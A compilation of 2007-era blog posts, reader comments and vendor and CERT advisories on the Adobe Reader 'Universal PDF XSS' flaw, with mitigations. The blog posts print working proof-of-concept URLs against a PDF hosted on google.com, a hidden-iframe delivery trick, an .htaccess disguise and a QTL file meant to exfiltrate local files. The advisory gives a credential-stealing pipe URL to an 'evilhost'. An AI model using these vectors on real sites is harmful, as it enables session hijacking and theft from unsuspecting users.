# DANGER, DANGER, DANGER

[pdp](/members/pdp.html)

The WEB has gone crazy. I know that this is not news for some of you but you will be surprised to what extend this craziness has just developed. Among the traditional [QuickTime Movie](/blog/backdooring-quicktime-movies/), [QTL](/blog/backdooring-mp3-files/), [Flash](/blog/backdooring-flash-objects-receipt/), [Image](/blog/backdooring-images), [HTML](/blog/backdooring-web-pages) and [PDF](http://michaeldaw.org/md-hacks/backdooring-pdf-files/) vulnerabilities, there is now another one trivially exploitable with somewhat high degree of impact.

> So we have changed a lot of diapers last year. Simple things we do suddenly have become very dangerous and risky. If you think that user supplied Image files are safe, think again. There were [several attacks affecting social networks](/blog/myspace-quicktime-worm-follow-up) and a couple of [very successful AJAX worms](https://www.gnucitizen.org/topics/myspace-worms), again affecting social networks, during the last year. However, it seams that we haven't really scratch the surface yet.

Back in September 2006 David and I had a [small adventure with Adobe's PDF technology](http://michaeldaw.org/md-hacks/backdooring-pdf-files/). David made several issues with JavaScript for PDF publicly available and the findings were quite shocking for many people including us. Today, it seams that PDF documents can execute JavaScript code for no apparent reason by using the following template.

```
http://**path/to/pdf/file.pdf**#**whatever_name_you_want**=javascript:**your_code_here**
```

You must understand that the attacker doesn't need to have write access to the specified PDF document. In order to get an XSS vector working you need to have a PDF file hosted on the target and that's all about it. The rest is just a matter of your abilities and desires.

This [finding was originally mentioned](http://www.disenchant.ch/blog/hacking-with-browser-plugins/34) by [Sven Vetsch](http://www.disenchant.ch/blog), on his blog. The attack vector was [discovered by Stefano Di Paola and Giorgio Fedon](http://events.ccc.de/congress/2006/Fahrplan/events/1602.en.html). This is a very good and quite interesting finding. Good work.

*Just to show you the impact of this issue I prepared the following POC.*

```
[http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:function createXMLHttpRequest(){   try{ return new ActiveXObject('Msxml2.XMLHTTP'); }catch(e){}   try{ return new ActiveXObject('Microsoft.XMLHTTP'); }catch(e){}   try{ return new XMLHttpRequest(); }catch(e){}   return null;}var xhr = createXMLHttpRequest();xhr.onreadystatechange = function(){    if (xhr.readyState == 4)        alert(xhr.responseText);};xhr.open('GET', 'http://www.google.com', true);xhr.send(null);
](http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:function createXMLHttpRequest(){   try{ return new ActiveXObject()
```

When you open the PDF document, an XMLHttpRequest will be made to google.com and the front page source code will be displayed inside an alert box. Obviously, attackers can create a lot more dangerous scenario, where highly sensitive information is leaked leaving the user totally blind of what is going on.

This attack vector has several benefits that I must elaborate on. First of all, it is obvious that this is not a server side problem. This is totally client side and Web app owners cannot do much about it. The only solution is to have Adobe release a patch as soon as possible or just not to host PDF files at all. Obviously the second solution is highly unfeasible. This leave us with Adobe fixing the bug, but let's be honest with each other. Things won't get better. It is not that Adobe don't have good guys there or they are irresponsible. It is just the fact that not that many people update their PDF reader mainly because it usually requires a large chunk of data being downloaded and installed. The process is very slow and bulky and puts off even security-minded people.

*Now we have a prove that every site on this planet is vulnerable to XSS (Cross-site scripting). This is definitely not nice. Unwillingly we have become solicitors of a very dangerous craft.*

It seems that I didnâ€™t copy paste the credits out of my document I wrote with the content of this entry :(
Of course Iâ€™ve to give some credit to Stefano Di Paola and Giorgio Fedon because they found this flaw and not me at all.
As you see, I edited my blog entry. Next time Iâ€™ll be more careful and perhaps donâ€™t write blog entries when Iâ€™m as tired as I was when I wrote it.
@pdp
Please also edit your blog entry. thx![David Kierznowski](//gravatar.com/avatar/1d95d2324345e3dd2e41d6066cc1b492?s=256&d=retro)David Kierznowskipdp, I haven't tested this yet but it looks like a great find.
Users with Foxit PDF viewer are not vulnerable to this; at least those without the JavaScript plugin installed (the default). So those who learn't last time round should be ok.![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpSven, fixed!![Tester Zero](//gravatar.com/avatar/4795a17a0bae736c10070ae024af0ad9?s=256&d=retro)Tester ZeroThis flaw could be really bad.

Any thoughts ?![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpTester Zero, indeed.
Jason, yes... although some people are getting different results. For example, the following conditions are exploitable:

* IE 6 SP 1 with version of Acro Reader older than 8.0
* Firefox 2.0.0.1 win32
* Firefox 1.5.0.8 win32
* Opera 8.5.4 build 770 win32
* Opera 9.10.8679 win32

The damage is huge.![saso](//gravatar.com/avatar/3eda6fcd3204ef285fa52176c28c4d3e?s=256&d=retro)sasoaccording to the this page from the original author of this article from CCC this is already fixed in adobe acrobat 8 (as far as we talk strictly about the pdf issue since the original topic of the article is more wide/general about ajax/web2 attacks)
http://www.wisec.it/vulns.php?page=9![mike](//gravatar.com/avatar/a69965c15b2bdfbc552673feb409dc1e?s=256&d=retro)mikeIt doesn't work in Linux I tried
- kpdf
- evince
- adobe reader 7.0![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpmike, it affects strickly Adobe Acrobat. saso, several researchers report Acrobat 8 as one of the vulnerable. I guess it depends on that platform and the current acrobat patch level.![Kris](//gravatar.com/avatar/a726471b84c6ee4be1fd312c4c203320?s=256&d=retro)KrisI couldn't replicate it on IE7 with either reader 7 or 8 at all, although I could reproduce the problem on FF.
Now I'm starting wonder how huge this really is: Acrobat 8 has been out for at least 6 months, IE7 for 3 or so, and is getting a major push from MS. Either update will fix the problem, and what, 85% or so of the world is still on IE?
It's definitely still a big deal, but it's not something companies with a decent software update policy will need to lose sleep over right now.![david](//gravatar.com/avatar/c3c67ef1a4beba7889ca36b0c609cad4?s=256&d=retro)davidI've seen a couple of places that the "wprkaround" is to turn off JS in your browser. From the client-side, wouldn't it be sufficient to just remove/replace the Adobe Acrobat browser plug-in?![Smaxor](//gravatar.com/avatar/14336f1c911b9b5e36b601ab02c5bba8?s=256&d=retro)SmaxorDoesn't seem to work in IE6 with Acrobat 7.![CumpsD](//gravatar.com/avatar/79133241cc9c11c3b53e32f1648c462d?s=256&d=retro)CumpsDWindows 2003 R2 SP1, x64, FF 1.5.0.8, Adobe Reader 7.0.8: PoC worked.
Fixed it by telling FF to give me the download box for pdf files in the future :)![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpKris, I see you point of veiw but I don't quite agree with it. IMHO, this vulnerability will be present for a while. In fact, I can see some development on new types of WEB worms that can simulationsly spread over several social networks. The impact of this issue is huge.
Web worms can use Jeremiah's [css history dump](https://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html) and [login detection](https://jeremiahgrossman.blogspot.com/2006/12/i-know-if-youre-logged-in-anywhere.html) hacks together with the [Google AJAX Search API hack](https://www.gnucitizen.org/blog/google-search-api-worms) in order to create a massive WEB infection. In fact, such type of malicious code can be trivially composed in half an hour. This is a vary scary thought.![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpSmaxor, what's your patch level? I have a sneak suspecion that the IE POC works on different SPs.![Leonard Rosenthol](//gravatar.com/avatar/417010b387f0b9f02fa4abb199ab2958?s=256&d=retro)Leonard RosentholA couple of points on this...
1) This issues ONLY effects the Windows platform. Mac, Linux, etc. users are NOT effected.
2) We found this issue out ourselves during our own security/vulnerability testing of Acrobat and introduced a fix as part of Acrobat/Reader 8 for Windows. As such, users of Acrobat/Reader 8 (regardless of browser) are NOT EFFECTED!
3) We already have patches prepared for earlier versions of Acrobat and will release those as soon as they are ready. This will address those users who are unable/unwilling to upgrade to Acrobat/Reader 8.
We thank the community for their concern in identifying vulnerabilities in our products and hope that our having the issues already addressed in our current versions will serve to alleviate concerns and demonstrate our commitment to this area.

Adobe Systems![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpLeonard, I am not surprised that actions has already been taken. I remember the last time your company respond was quite on time.
The one million dollar question is: how quickly your update will propagate? I think this is the concerning bit emerging from the current situation.![kirsplat](//gravatar.com/avatar/b370d492c1af7e32fd6ac0210c56a186?s=256&d=retro)kirsplatIt does work on Linux - FF: 1.5.0.9 + adobe reader 7![Ross](//gravatar.com/avatar/181047487d339dad357ae9ba6d78ca9a?s=256&d=retro)RossThe concern I have is that we have a very tight security policy here and this is the first bug I've seen in about 18 months that's actually going to affect us.
Here we have to use IE but only trusted sites are allowed to run any kind of Javascript, ActiveX control, etc. Non trusted sites can't even open PDF files directly so ordinarily vulnerabilities don't affect us at all.
However this bug appears to allow an untrusted site to open a PDF from a trusted site and I can only assume that means it will run the code from the security context of the trusted site too. That is a very serious concern for us.
My other concern is that Acrobat Reader is a nightmare to update, it's one of the worst programs we have for deploying updates, and I can see this being a popular attack vector because of it's widespread use and the problems updating it.
We'll get Acrobat updated on our computers today, but I wonder how long this vulnerability would have gone quietly unnanounced by Adobe...![.mario](//gravatar.com/avatar/7ef1c803c904b9a9834d3bd7645790bb?s=256&d=retro).marioAnd now it's local - credits for the basic PoC go to RSnake.

If you've updated your internet software since last autumn then you're already covered, with the free Adobe Reader 8. (This info was available in Stefano & Giorgio's initial paper, and in the CERT advisory.)
As Leonard advised, patches for those who cannot update to the current version (old OS, locked intranet etc) are expected for download next week.

Not just FF, but also Mozilla which I use (Mozilla 1.7.7) also have this issue.
On Win XP Pro SP2 (and most probably XP HE also as previous Windows XP, such as Gold and SP1).
Just need Acrobat plugin installed in your browser.![MustLive](//gravatar.com/avatar/997a9fa55e557e2aa8262a07758b161d?s=256&d=retro)MustLiveIt is realy danger and widespread vulnerability, boys.

While the number of vulnerable clients should be significantly lower now, I would still avoid offering PDFs in the vulnerable configuration at least until IE6 goes byebye, if it ever does. I think that a place like a bank simply could not afford to let even one or two customers log in affected by a bug of this magnitude, per year. Granted, banks probably have unique IDs on all their forms and yada yada yada... But every exploit you allow is a piece of the puzzle for a nice combined exploit that crumbles your bones to dust in the advent of Murphy's Law. You can't win forever et cetera et cetera....

Alert
# Adobe Reader and Acrobat Vulnerabilities

Last RevisedJanuary 24, 2013
Alert CodeTA09-286B

### Systems Affected

* Adobe Reader and Acrobat 9.1.3 and earlier 9.x versions
* Adobe Reader and Acrobat 8.1.6 and earlier 8.x versions
* Adobe Reader and Acrobat 7.1.3 and earlier 7.x versions

### Overview

Adobe has released Security bulletin [APSB09-15](http://www.adobe.com/support/security/bulletins/apsb09-15.html), which describes multiple vulnerabilities affecting Adobe Reader and Acrobat.

Adobe Security Advisory [APSB09-15](http://www.adobe.com/support/security/bulletins/apsb09-15.html) describes a number of vulnerabilities affecting Adobe Reader and Acrobat. These vulnerabilities affect Reader  9.1.3 and earlier 9.x versions, 8.1.6 and earlier 8.x versions, and 7.1.3 and earlier 7.x versions.

An attacker could exploit these vulnerabilities by convincing a user to open a specially crafted PDF file. The Adobe Reader browser plug-in is available for multiple Web browsers and operating systems, which can automatically open PDF documents hosted on a Web site.

These vulnerabilities are being actively exploited.

### Impact

These vulnerabilities allow a remote attacker to execute arbitrary code, write arbitrary files or folders to the filesystem, escalate local privileges, or cause a denial of service on an affected system as the result of a user opening a malicious PDF document.

### Solution

**Update**

Adobe has released updates to address this issue. Users are encouraged to read Adobe Security Bulletin [APSB09-15](http://www.adobe.com/support/security/bulletins/apsb09-15.html) and update vulnerable versions of Adobe Reader and Acrobat.

**Enable Data Execution Prevention (DEP) in Microsoft Windows**

Consider enabling Data Execution Prevention (DEP) in supported versions of Windows. DEP should not be treated as a complete workaround, but DEP can mitigate the execution of attacker-supplied code in some cases. Microsoft has published detailed technical information about DEP in Security Research & Defense blog posts "Understanding DEP as a mitigation technology" [part 1](http://blogs.technet.com/srd/archive/2009/06/05/understanding-dep-as-a-mitigation-technology-part-1.aspx) and [part 2](http://blogs.technet.com/srd/archive/2009/06/12/understanding-dep-as-a-mitigation-technology-part-2.aspx). Use of DEP should be considered in conjunction with the application of patches or other mitigations described in this document.

Disable JavaScript in Adobe Reader and Acrobat

Disabling JavaScript may prevent some exploits from resulting in code execution. Acrobat JavaScript can be disabled using the Preferences menu (Edit -> Preferences -> JavaScript; un-check Enable Acrobat JavaScript).

Prevent Internet Explorer from automatically opening PDF documents

The installer for Adobe Reader and Acrobat configures Internet Explorer to automatically open PDF files without any user interaction. This behavior can be reverted to a safer option that prompts the user by importing the following as a .REG file:

Windows Registry Editor Version 5.00

[HKEY\_CLASSES\_ROOT\AcroExch.Document.7]
"EditFlags"=hex:00,00,00,00

Disable the display of PDF documents in the Web browser

Preventing PDF documents from opening inside a Web browser will partially mitigate this vulnerability. If this workaround is applied it may also mitigate future vulnerabilities.

To prevent PDF documents from automatically being opened in a Web browser, do the following:

1. Open Adobe Acrobat Reader.
2. Open the Edit menu.
3. Choose the preferences option.
4. Choose the Internet section.
5. Un-check the "Display PDF in browser" check box.

Do not access PDF documents from untrusted sources

Do not open unfamiliar or unexpected PDF documents, particularly those hosted on Web sites or delivered as email attachments. Please see Cyber Security Tip [ST04-010](/ncas/tips/ST04-010.html).

Adobe Acrobat Reader Plugin - Multiple Vulnerabilities
Original Advisory:
http://www.wisec.it/vulns.php?page=9
Original Discovery and Research:
Stefano Di Paola
Contribution:
Giorgio Fedon (IE Dos, UXSS Analysis)
Elia Florio (Poc and Code Execution analysis)
Status: Vendor Informed on 15 October 2006
Patched: Yes
Please upgrade your current version of adobe acrobat
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Brief Intro:
During our lecture at 23C3 (Subverting Ajax), we presented
some interesting attack vectors to take advantage of
the dangerous vulnerability called "Prototype Hijacking"
in browser frameworks. Any XSS represents a good
entry point, and single Universal XSS is de facto the best
entry point.
Since Adobe did a great job and patched in less than 1
month the issues herein reported, we decided to
undisclose our findings during 23C3 to make the audience
better understand risks and impacts of high-level plugins
vulnerabilities (e.g. Func. Integration and not memory
corruption).
There is also a possible remote code execution (RCE), but
was not the focus of our talk.
Affected Versions:
Adobe Acrobat Reader plugin 7 (fully patched) and Below
Tested On:
Firefox 1.5.0.7 and Below, 2.0RC2 under Windows XP SP2
Firefox 1.5.0.7 and Below, 2.0RC2 under Ubuntu 6.06
Internet Explorer SP2 under Windows XP SP2
Summary:
Adobe Acrobat plugin for Mozilla Firefox (acroreader) is able to
populate Portable Documents
(PDF files) forms by supplying an external set of datas through the FDF,
XML, or XFDF fields.
Implementation of FDF, XML, XFDF
(http://partners.adobe.com/public/developer/en/acrobat/PDFOpenParameters
.pdf)
functionalities in Acrobat Reader Plugin is vulnerable to different kind
of attacks.
Vulnerability extent changes from browser to browser:
1. Universal CSRF / session riding;
(Mozilla Firefox, Internet Explorer, Opera + Acrobat Reader plugin)
2. UXSS in #FDF, #XML e #XFDF;
(Mozilla Firefox + Acrobat Reader plugin)
3. Possible Remote Code Execution;
(Mozilla Firefox + Acrobat Reader plugin)
4. Denial of Service;
(Internet Explorer + Acrobat Reader plugin)
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
1. Universal CSRF and session riding
This is probably Adobe related as all tested browsers (IE,Firefox,Opera)
where affected.
The issue is that by creating a special link like this:
http://site.com/file.pdf#FDF=http://victim.com/index.html?param=...
automatically Adobe plugin sends a request to 'victim.com' without user
interaction asking
for defined page in 'fdf' parameter. This could be used as a Universal
Session Riding (aka UCSRF)
attack which is a well known vulnerability.
Note that the same effect is accomplished by using 'xml' and 'xfdf'
parameters.
=====
2. UXSS in #FDF, #XML e #XFDF
In addition by using the following request, is possible to execute
javascript code
inside Firefox browser:
http://site.com/file.pdf#FDF=javascript:alert('Test Alert')
The previous could be triggered against a site and because of this is a
Universal Cross Site
Scripting.
UXSS is a particular type of Cross Site Scripting and has the ability to
be triggered
by exploiting flaws inside browsers, instead of leveraging the
vulnerabilities against
insecure web sites. It's also possible to force clients to download
files by supplying:
http://site.com/file.pdf#FDF=javascript:document.location=
'file://C:/winnt/notepad.exe'
<Alternative\_Attack>
Alternative Attack using NamedPipes
- http://www.514.es/2006/10/exploiting\_win32\_design\_flaws.html
In order to steal Domain credentials with explorer :
http://anyhost/file.pdf#fdf=res://\evilhostpipeapipe
and then by applying techniques found in 514.es paper we found
this kind of url and protocol (res://) could be used too.
This means that also Internet Explorer could be abused in conjunction
of
Adobe plugin to make attacks on internal LANs and get victims
credentials.
</Alternative\_Attack>
3. Possible Remote Code Execution
There is also a possible Remote code Execution by leveraging a memory
corruption inside
Firefox by supplying the following request:
http://site.com/file.pdf#FDF=javascript:document.write('jjjjj...');
It's possible to cause a DoubleFree() error and to overwrite part of the
Structural
Exception Handler.
Runtime vulnerability analisys
The problem seems to be caused by a "Double MSVCRT.free()" executed by
Acrobat plugin.
The routine which cause Firefox to crash is located in the following
call to NP\_Shutdown().
Elia Florio is credited for Runtime analysis and exploitation.
NB. The POC of this vulnerability won't be released.
=====
4. Denial of Service (Internet Explorer only);
By supplying the following request via the web browser,
it's possible to cause a denial of service in Internet Explorer:
http://site.com/file.pdf#####...(More '#')
The application is waiting for more inputs and allocates more memory.

Release updates from the Chrome team

## [Stable, Beta update: Yahoo! Mail and Security Fixes](https://chromereleases.googleblog.com/2009/01/stable-beta-update-yahoo-mail-and.html "Stable, Beta update: Yahoo! Mail and Security Fixes")

Wednesday, January 28, 2009

Google Chrome's Beta and Stable channels have been updated to 1.0.154.46. (Note, we won't have a different release for the Beta channel until we have something Beta-worthy come out of the Dev channel in February.)
This release fixes issues with two popular webmail providers:

* Sending mail from Yahoo! Mail works again.
* Windows Live Hotmail now works. While the Hotmail team works on a proper fix, we're deploying a workaround that changes the user agent string that Google Chrome sends when requesting URLs that end with mail.live.com.

  If you've been using the --user-agent switch to use Hotmail, you can remove the switch from your shortcuts with this release.

This release also includes two security updates. The [release notes](http://sites.google.com/a/chromium.org/dev/getting-involved/dev-channel/release-notes) have the full list of changes.
**Security Updates**
> **Work around for "Adobe Reader Plugin Open Parameters Cross-Site Scripting Vulnerability"** CVE: CVE-2007-0048, CVE-2007-0045Google Chrome now refuses requests for javascript: URLs in Netscape Plugin API (NPAPI) requests from the Adobe Reader plugin. Adobe is aware of this issue and has helped us develop this mitigation while they work on a fix for all users.
> **Severity**: Moderate. This could allow a PDF document to run scripts on arbitrary sites.**Credit**: Thanks to Michael Schmidt for reporting this responsibly to Google.
> **Javascript Same-Origin Bypass**CVE: CVE-2009-0276A bug in the V8 JavaScript engine could allow bypassing same-origin checks in certain situations.
> **Severity**: High. A malicious script in a page could read the full URL of another frame, and possibly other attributes or data from another frame in a different origin. This could disclose sensitive information from one website to a third party.**Credit**: Found internally by Google.

# Security advisory

## Server-side workarounds to prevent potential cross-site scripting vulnerability in versions 7.0.8 and earlier of Adobe Reader and Acrobat

**Release date:** January 9, 2007

**Vulnerability identifier:** APSA07-02

**CVE number:** CVE-2007-0045

### Summary

This Security Advisory is intended to provide server-side workarounds for website operators to prevent the cross-site scripting vulnerability documented in [Security Bulletin APSB07-01](/go/apsb07-01). Adobe recommends that Adobe Reader and Acrobat users [update their software](/go/apsb07-01) to prevent the issue.

### Solution

Adobe recommends that Adobe Reader and Acrobat users [update their software](/go/apsb07-01) to prevent the issue. Potential server-side workarounds are detailed below.

**NOTE:** Before applying any of these configuration changes to your production servers they should be tested to make sure they work for your environment.

**Modify the MIME type of PDFs.**

One way to prevent the Adobe Reader and Acrobat Plugins from passing JavaScript to the browser is to force PDFs to open outside of the browser and Adobe Reader or Acrobat Professional. To accomplish this, change the MIME (Multipurpose Internet Mail Extension) type of the .pdf file extension (application/pdf) to a generic binary (application/octet-stream) which the web browser then will prompt the user to open or save.

| IIS 6.0 | 1. Open the Internet Information Services Manager. 2. Locate the folder containing PDFs under your website. 3. Right-click the folder and select **Properties**. 4. Select the **HTTP Headers** tab. 5. Click the **MIME Types…** button. 6. Click the **New...** button to create a new MIME type. 7. Enter **pdf** for the Extension and **application/octet-stream** for MIME type. 8. Click **ok**. 9. Click **ok**. 10. Click **ok** to apply the changes.   Note: This property can changed on a specific file. |
| --- | --- |
| Apache 2.2.3 | Use mod\_mime and AddType or mod\_rewrite   1. Open **httpd.conf** or .htaccess 2. Locate the **<IfModule mime\_module>** section 3. Insert **AddType application/octet-stream .pdf** 4. Close and Save **httpd.conf** or .htaccess 5. Restart the Apache Service |

**Add the Content-Disposition Header**

Similar to changing the MIME type, a Content-Disposition Header can be added to the server response.

| IIS 6.0 | 1. Open the Internet Information Services Manager. 2. Locate the folder containing PDFs under your website. 3. Right-click the folder and select **Properties**. 4. Select the **HTTP Headers** tab. 5. Click the **MIME Types…** button. 6. Click the **Add** button in the Custom HTTP Headers section. 7. Add a header named **Content-Disposition** with a value of   **attachment; filename=yourfile.pdf**   1. Click **ok** to apply the changes.   Note that this setting is applied on a per file basis. |
| --- | --- |
| Apache 2.2.3 | Use mod\_headers   1. Open httpd.conf 2. Add   **<IfModule mod\_headers.c>** **<FilesMatch "\.pdf$">** **Header append Content-Disposition "attachment;"** **</FilesMatch>** **</IfModule>**   1. Close and Save httpd.conf 2. Restart the Apache Service |

**Store PDF in a non web-accessible location**

Lastly, in an environment where access to the configurations files is not possible, consider creating server-side code (ColdFusion, Java, PHP, ASP.NET, etc) to read the file and send it back as part of the Response.  For example, MyPDF.cfm could be a script that returns the real PDF.

Note: you will still need to set the Response.ContentType to “application/pdf” or “application/octet-stream”. Review your server-side language documentation for more information.

### Severity Rating

Adobe categorizes this as an [important](/devnet/security/security_zone/severity_ratings.html) issue and recommends affected users update their software.

### Details

This Security Advisory is intended to provide server-side workarounds for website operators to prevent the cross-site scripting vulnerability documented in [Security Bulletin APSB07-01](/go/apsb07-01). A cross-site scripting (XSS) vulnerability in versions 7.0.8 and earlier of Adobe Reader and Acrobat could allow remote attackers to inject arbitrary JavaScript into a browser session. This issue could occur when a user clicks on a malicious link to a PDF file. Exploitability depends on the browser and browser version being used. This vulnerability does not allow execution of binary code. This issue is remotely exploitable. Adobe recommends that Adobe Reader and Acrobat users [update their software](/go/apsb07-01) to prevent the issue.

# Universal PDF XSS After Party

Thu, 04 Jan 2007 12:14:52 GMTby
[pdp](/members/pdp.html)
> Everybody [knows](/blog/danger-danger-danger) about it. Everybody [talks](http://www.webappsec.org/lists/websecurity/archive/2007-01/msg00005.html) about it. We had a nice party. It is time for estimating the damages. In this article I will try to show the impact of the Universal PDF XSS vulnerability by explaining how it can be used in real life situations.

For those who has slept over the last two days, here is a short introduction of what this talk is going to be about:

The Universal PDF XSS issue was [discovered](http://events.ccc.de/congress/2006/Fahrplan/events/1602.en.html) by Stefano Di Paola and Giorgio Fedon and it was presented on [23C3 security conference](http://events.ccc.de/congress/2006/Home). This vulnerability obviously affects the Adobe Acrobat Reader which is a widely used software among business, non-business organizations and individuals. By abusing [Acrobat's open parameter features](http://partners.adobe.com/public/developer/en/acrobat/PDFOpenParameters.pdf) well protected sites become vulnerable to Cross-site scripting attacks if they host PDF documents. This is pretty bad and unless you update your reader or change the way your browser handles PDF documents, you may get hacked quite badly. This issue is very serious.

The way attackers use PDF documents to execute JavaScript code is outlined with the following template. The code will be executed on the domain where the PDF files is hosted on:

```
http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:**code_here**
```

Now we know what we are going to talk about, lets have a look on how attackers can use this vulnerability to abuse your WEB presence.

First of all it will be good to mention that PDF is widely used document format. In fact, every major site (I don't want to say every site, although I wont be far from the truth) hosts at least one PDF document. This makes the situation a lot worse because If you happen to be on a malicious site or you click a malicious link, attackers can simultaneously compromise several of your WEB accounts that are currently open/authenticated.

For further clarification lets say that you have accounts in MySpace and Freindster and several other social networks open and then you visit a random page that has a XSS PDF exploit. The attacker that controls this page will be able to get your session ID on all of your social network profile pages and as such successfully hijack your identity. This is just one possible scenario. Attackers are also able to tamper your profile page in order to assure future access to your and your friends' profiles as well. That will happen in a matter of seconds so you can see that from this point on you have to be extra conscious with your WEB activities. Disable JavaScript or update to Acrobat 8.

I mentioned that either you have to click on a link or visit a page in order to get the exploit working. In general you need some type of user interaction. First of all, clicking on a link could be a bit suspicious if you think about it. Unless you really want to open a PDF document, there is no need for doing so. However attackers can make use of sneak techniques to force you somehow, by changing the file extension of the PDF document to .mp3 or .mov or even .html. It looks less suspicious, but still when pulled from the server the content will be served as application/pdf:

```
#.htaccess
RewriteEngine On
RewriteRule *\.(jpg|png|css|mp3|mov|avi)$ http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf
```

If the user clicks on something like the following URL:

```
http://currentdomain/whatever.mp3#something=javascript:**malicious_code**
```

The code will be executed on Google not on currentdomain. The user has fallen into the trap. You can see that you should not trust links and your browser status bar because they could say something that is not really the truth.

It is also worth mentioning that there are many variations of this attack vector. In fact, there are so many variations that its not worth discussing all of them. However, here is another interesting one. I presume you are already familiar with TinyURL. In simple words, attackers can store an entire XSS vector for a specific site and recall it anytime they need it by using the TinyURL service. I shrunk the following URL which contains harmless XSS exploit for Google:

```
[http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:alert('xss');](http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:alert()
```

TinyURL generated the following shortened URL:

```
[http://tinyurl.com/t8h4q](http://tinyurl.com/t8h4q)
```

If you paste the above URL into your browser address bar you should get an alert message saying XSS. The ability for shrinking and obfuscating URLs with TinyURL and other technologies makes the Universal PDF XSS a pure evil. URLs are easily exchangeable via simple text messages, emails and IM [chat](https://chatbotkit.com) sessions. The impact is huge.

The second way for getting the exploit working is by automatically opening it without user interaction, although the user needs to attend a malicious resource first. In order to make the vector working the attacker sets a hidden iframe that contains the malicious URL. Upon visit, the exploit executes.

```
<iframe src="http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:**code_here**" style="width:0;height:0;border:0"></iframe>
```

I mentioned that TinyURL can contain the entire XSS attack vector. Then you can easily execute it like this:

```
<iframe src="http://tinyurl.com/t8h4q" style="width:0;height:0;border:0"></iframe>
```

This is very bad because attackers can have multiple iframes in a single page that upon visit will exploit whatever WEB accounts you currently have open. It is totally stealth and extremely malicious.

Probably you are thinking that this can be used quite successfully to create a WEB worm infection. It is true! Obviously it is possible. A WEB worm of such a degree will be the first one that spreads on the top of the WEB without the restrictions introduced by the same origin security policy. The infection process can be very simple if you think about it. First of all the worm needs to have some kind of mechanism for discovering potential target. Google proves to be quite helpful with that. In this case either Google AJAX Search API (restricted) will be used or a hosted PDF document to do real Google searches on the main WEB Search interface (unrestricted). Once the worm finds a target, the infection algorithm is launched. Upon visit of a infected resource propagation process restarts.

It is also possible to have some sort of update mechanism for this type of worm. For [example](https://chatbotkit.com/examples) if one of the currently crawled sites contains XML comments with specially declared JavaScript code, the worm can mutate by adding the foreign code into its core. This way older generation worms can leave genetic code/clues for current generations. As you can see, this type of malicious code can be extremely dangerous and agile.

The Universal PDF XSS is probably one of the worst things that has happened to the web. This vulnerability affects almost every website. Here is another news for you: your local file system is subjected to external attacks as well.

The problem is that Adobe Acrobat comes with a couple of demo PDF documents. RSnake was first to report this specific attack vector. If you have Adobe Acrobat 7 you can execute JavaScript on your local filesystem. Because of the same origin policy, this JavaScript code can list your disk and send private files to a remote collection point.

```
file:///C:/Program%20Files/Adobe/Acrobat%207.0/Resource/ENUtxt.pdf#something=javascript:**code_here**
```

You can see that the above URL is accessed with the file protocol. This means that we have access to other resources served by the same protocol. For more information how to access the file system, read the current user history file, dump the registry, download the SAM file or access other sensitive information read [here](/blog/web-pages-from-hell) and [here](/blog/web-pages-from-hell-2).

This is why the situation is very bad not only for Adobe but also for the users and the security community. I did investigation to see what is the situation with most Social Networks that I know about. Almost all of them have PDF files. I wonder what will be next.

![PartyOf1](//gravatar.com/avatar/92f59ee8c48437e8ac3405abc5075bb5?s=256&d=retro)PartyOf1Does all this work if running from a Virtual Machine?
How about if end user starts up browser from SandboxIE, what happens in this case?
Just my 2/100$![zmx32](//gravatar.com/avatar/623ed3fa2a7d578af692b4391d8b304a?s=256&d=retro)zmx32you may want to check

if you run in SandboxIE or Sandboxed FF then there will be no impact at all. If you are inside a Virtual Machine then only the emulated disk will be attacked. I guess you shouldn't be worried in that case.![luma](//gravatar.com/avatar/7e907ebcb3846cb393630eb424d839ed?s=256&d=retro)lumafile:///C:/Program%20Files/Adobe/Acrobat%207.0/Resource/ENUtxt.pdf#something=javascript:your\_code\_here
How can an attacker exploit this? Because the user have to open this url directly for this to work. It can't be loaded into an iframe, or be redirected to by anything.![.mario](//gravatar.com/avatar/7ef1c803c904b9a9834d3bd7645790bb?s=256&d=retro).mario@luma: e.g. take the link, put it into a short url, (digg|delicuious|dzone) it or send it around via im and there you go...![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpluma, indeed... fortunately this is the case. However, we are hackers aren't we? So lets think outside of the box. I found a very simple technique for triggering the above URL automatically circumventing the browser same origin security policies. We can do that with QTL files. For more information how QTL files can be abused read [here](https://www.gnucitizen.org/blog/backdooring-mp3-files/).
Create a QTL file with mp3, mp4, mov, avi or qtl extension. Put the following content inside:
```
<?xml version="1.0">
<?quicktime type="application/x-quicktime-media-link"?>
<embed src="a.mp3" autoplay="true" qtnext="file:///C:/Program%20Files/Adobe/Acrobat%207.0/Resource/ENUtxt.pdf#something=javascript:your_code_here"/>
```
When the user visits the file, their local file system will be explored and dumped on a remote machine. It is a bit evil I know.![Richard Moore](//gravatar.com/avatar/c835240f868ac44ee8ca22837d4e5d04?s=256&d=retro)Richard MooreWorks comes with a PDF too and is almost always installed:

